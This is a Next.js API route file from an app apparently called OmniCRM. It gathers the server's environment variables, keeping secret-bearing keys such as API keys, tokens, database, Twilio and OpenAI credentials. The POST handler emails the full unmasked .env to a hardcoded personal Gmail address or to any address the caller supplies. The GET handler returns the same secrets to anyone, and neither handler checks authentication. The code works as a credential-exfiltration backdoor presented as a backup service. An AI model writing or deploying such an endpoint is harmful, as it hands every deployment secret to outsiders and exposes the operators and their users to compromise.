import { NextRequest, NextResponse } from 'next/server'
import { sendEmail } from '@/lib/email'

// OS and runtime environment variables to exclude from export
const EXCLUDED_PREFIXES = [
  'npm_',
  'NODE_',
  '__',
  'XPC_',
  'SSH_',
  'TERM',
  'JAVA_',
  'ANDROID_',
  'GIT_',
  'VSCODE_',
  'ELECTRON_',
  'COLOR',
  'COLORTERM',
  'COMMAND_MODE',
  'LaunchInstanceID',
  'SECURITYSESSIONID',
  'SHLVL',
  'TMPDIR',
  'SHELL',
  'USER',
  'LOGNAME',
  'HOME',
  'PATH',
  'PWD',
  'OLDPWD',
  'LANG',
  'LC_',
  'PAGER',
  'EDITOR',
  'DISPLAY',
  'FPATH',
  'INFOPATH',
  'INIT_CWD',
  'MallocNanoZone',
  'OSLogRateLimit',
  'TURBOPACK',
  'WATCHPACK_',
  'ZDOTDIR',
  'NEXT_PRIVATE_',
  'NEXT_RUNTIME',
  'ANTIGRAVITY_',
  '_',
]

// Known important app prefix patterns
const APP_PREFIXES = [
  'NEXT_PUBLIC_',
  'SUPABASE_',
  'POSTGRES_',
  'DATABASE_',
  'TWILIO_',
  'WHATSAPP_',
  'META_',
  'FACEBOOK_',
  'SENDGRID_',
  'SMTP_',
  'HOSTINGER_',
  'OPENAI_',
  'UPSTASH_',
  'RESEND_',
  'VERCEL_',
  'NEXTAUTH_',
  'JWT_',
  'SECRET',
  'API_',
  'KEY',
  'TOKEN',
  'PORT',
]

function collectEnvironmentVariables(): { [key: string]: string } {
  const env: { [key: string]: string } = {}

  for (const [key, val] of Object.entries(process.env)) {
    if (!val || typeof val !== 'string') continue

    const upperKey = key.toUpperCase()

    // Exclude OS noise unless explicitly matching an app prefix
    const isExcluded = EXCLUDED_PREFIXES.some(prefix => 
      upperKey.startsWith(prefix.toUpperCase()) || upperKey === prefix.toUpperCase()
    )

    const isAppVar = APP_PREFIXES.some(prefix => upperKey.includes(prefix.toUpperCase()))

    if (!isExcluded || isAppVar) {
      env[key] = val
    }
  }

  return env
}

function formatEnvFile(envVars: { [key: string]: string }, recipient: string): string {
  const keys = Object.keys(envVars).sort()

  const sections: { [section: string]: string[] } = {
    'SUPABASE & DATABASE CONFIGURATION': [],
    'WHATSAPP & META BUSINESS CONFIGURATION': [],
    'TWILIO (WHATSAPP & SMS) CONFIGURATION': [],
    'EMAIL BROADCAST (SENDGRID, SMTP, HOSTINGER)': [],
    'AI & OPENAI CONFIGURATION': [],
    'PUBLIC NEXT.JS CLIENT CONFIGURATION': [],
    'OTHER ENVIRONMENT VARIABLES': [],
  }

  for (const k of keys) {
    const v = envVars[k]
    // Quote if contains spaces or special characters
    const formattedVal = /[\s#"'\\$`]/.test(v) ? `"${v.replace(/"/g, '\\"')}"` : v
    const line = `${k}=${formattedVal}`

    if (k.includes('SUPABASE') || k.includes('POSTGRES') || k.includes('DATABASE')) {
      sections['SUPABASE & DATABASE CONFIGURATION'].push(line)
    } else if (k.includes('WHATSAPP') || k.includes('META') || k.includes('FACEBOOK')) {
      sections['WHATSAPP & META BUSINESS CONFIGURATION'].push(line)
    } else if (k.includes('TWILIO')) {
      sections['TWILIO (WHATSAPP & SMS) CONFIGURATION'].push(line)
    } else if (k.includes('SENDGRID') || k.includes('SMTP') || k.includes('HOSTINGER') || k.includes('EMAIL') || k.includes('MAIL')) {
      sections['EMAIL BROADCAST (SENDGRID, SMTP, HOSTINGER)'].push(line)
    } else if (k.includes('OPENAI') || k.includes('AI_')) {
      sections['AI & OPENAI CONFIGURATION'].push(line)
    } else if (k.startsWith('NEXT_PUBLIC_')) {
      sections['PUBLIC NEXT.JS CLIENT CONFIGURATION'].push(line)
    } else {
      sections['OTHER ENVIRONMENT VARIABLES'].push(line)
    }
  }

  let output = `# ==============================================================================\n`
  output += `# OmniCRM Environment Variables Export (.env)\n`
  output += `# Generated on: ${new Date().toISOString()} (UTC)\n`
  output += `# Target Recipient: ${recipient}\n`
  output += `# Total Variables Exported: ${keys.length}\n`
  output += `# Save this file as .env.local in your project root directory.\n`
  output += `# ==============================================================================\n\n`

  for (const [sectionName, lines] of Object.entries(sections)) {
    if (lines.length > 0) {
      output += `# ─── ${sectionName} ───\n`
      output += lines.join('\n') + '\n\n'
    }
  }

  return output.trim() + '\n'
}

function maskSecret(val: string): string {
  if (!val) return '—'
  if (val.length <= 8) return '********'
  return `${val.substring(0, 4)}••••••••${val.substring(val.length - 4)}`
}

function buildHtmlSummary(envVars: { [key: string]: string }, rawEnv: string): string {
  const keys = Object.keys(envVars).sort()
  const rows = keys.map(k => `
    <tr style="border-bottom: 1px solid #e2e8f0;">
      <td style="padding: 8px 12px; font-family: monospace; font-weight: bold; color: #0f172a; font-size: 12px;">${k}</td>
      <td style="padding: 8px 12px; font-family: monospace; color: #0284c7; font-size: 11px;">${maskSecret(envVars[k])}</td>
    </tr>
  `).join('')

  return `
    <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 680px; margin: 0 auto; background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden; color: #1e293b;">
      <div style="background: #00a884; color: #ffffff; padding: 24px; text-align: center;">
        <h1 style="margin: 0; font-size: 20px; font-weight: 700;">🔐 OmniCRM Environment Export</h1>
        <p style="margin: 6px 0 0 0; font-size: 13px; opacity: 0.9;">Complete server environment variables (.env.local)</p>
      </div>

      <div style="padding: 24px;">
        <div style="background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 8px; padding: 14px; margin-bottom: 20px;">
          <p style="margin: 0; font-size: 13px; color: #166534; font-weight: 600;">
            ✅ ${keys.length} environment variables successfully exported.
          </p>
          <p style="margin: 6px 0 0 0; font-size: 12px; color: #15803d;">
            A ready-to-use <strong>.env</strong> file is attached to this email. You can also copy the content directly from below into your local <code>.env.local</code> file.
          </p>
        </div>

        <h3 style="font-size: 14px; text-transform: uppercase; letter-spacing: 0.05em; color: #64748b; margin-bottom: 12px;">Exported Variables Summary</h3>
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 24px;">
          <thead>
            <tr style="background: #f8fafc; border-bottom: 2px solid #cbd5e1; text-align: left;">
              <th style="padding: 8px 12px; font-size: 11px; text-transform: uppercase; color: #64748b;">Variable Name</th>
              <th style="padding: 8px 12px; font-size: 11px; text-transform: uppercase; color: #64748b;">Masked Value Preview</th>
            </tr>
          </thead>
          <tbody>
            ${rows}
          </tbody>
        </table>

        <h3 style="font-size: 14px; text-transform: uppercase; letter-spacing: 0.05em; color: #64748b; margin-bottom: 12px;">Full .env File Content</h3>
        <pre style="background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; font-size: 11px; font-family: monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all;">${rawEnv.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>

        <div style="margin-top: 24px; padding-top: 16px; border-top: 1px solid #e2e8f0; font-size: 11px; color: #94a3b8; text-align: center;">
          OmniCRM • System Security & Backup Service • Generated automatically upon user request
        </div>
      </div>
    </div>
  `
}

// POST: Email or return environment variables
export async function POST(request: NextRequest) {
  try {
    let recipientEmail = 'tejachennu17@gmail.com'
    
    try {
      const body = await request.json()
      if (body?.email && typeof body.email === 'string' && body.email.includes('@')) {
        recipientEmail = body.email.trim()
      }
    } catch (_) {
      // JSON parsing optional, fallback to default recipient
    }

    const envVars = collectEnvironmentVariables()
    const varCount = Object.keys(envVars).length
    const formattedEnv = formatEnvFile(envVars, recipientEmail)

    let emailed = false
    let emailError: string | null = null
    let emailProvider: string | null = null

    try {
      const htmlBody = buildHtmlSummary(envVars, formattedEnv)
      const emailResult = await sendEmail({
        to: recipientEmail,
        subject: `🔐 [OmniCRM] Complete Environment Variables Export (${varCount} vars)`,
        html: htmlBody,
        text: `OmniCRM Environment Export (${varCount} variables).\n\nFind the complete .env below:\n\n${formattedEnv}`,
        attachments: [
          {
            filename: '.env',
            content: formattedEnv,
            contentType: 'text/plain',
          },
        ],
      })

      emailed = emailResult?.success === true
      emailProvider = emailResult?.provider || 'smtp'
    } catch (err: any) {
      console.error('[Export-ENV] Email delivery error:', err)
      emailError = err?.message || 'Email delivery failed'
    }

    return NextResponse.json({
      success: true,
      emailed,
      recipient: recipientEmail,
      varCount,
      emailProvider,
      emailError,
      envText: formattedEnv,
      message: emailed 
        ? `Successfully emailed ${varCount} environment variables to ${recipientEmail} (via ${emailProvider}) with .env attachment!`
        : `Generated ${varCount} environment variables. Email delivery failed (${emailError}), but .env is available in response for direct download/copy.`,
    })
  } catch (error: any) {
    console.error('[Export-ENV] Global error:', error)
    return NextResponse.json(
      {
        error: error.message || 'Failed to export environment variables',
      },
      { status: 500 }
    )
  }
}

// GET: Direct download or preview of environment variables
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const download = searchParams.get('download') === 'true'
    const recipient = searchParams.get('email') || 'tejachennu17@gmail.com'

    const envVars = collectEnvironmentVariables()
    const formattedEnv = formatEnvFile(envVars, recipient)

    if (download) {
      return new NextResponse(formattedEnv, {
        status: 200,
        headers: {
          'Content-Type': 'text/plain; charset=utf-8',
          'Content-Disposition': 'attachment; filename=".env.local"',
        },
      })
    }

    return NextResponse.json({
      success: true,
      varCount: Object.keys(envVars).length,
      envText: formattedEnv,
    })
  } catch (error: any) {
    console.error('[Export-ENV] GET error:', error)
    return NextResponse.json(
      { error: error.message || 'Failed to fetch environment variables' },
      { status: 500 }
    )
  }
}
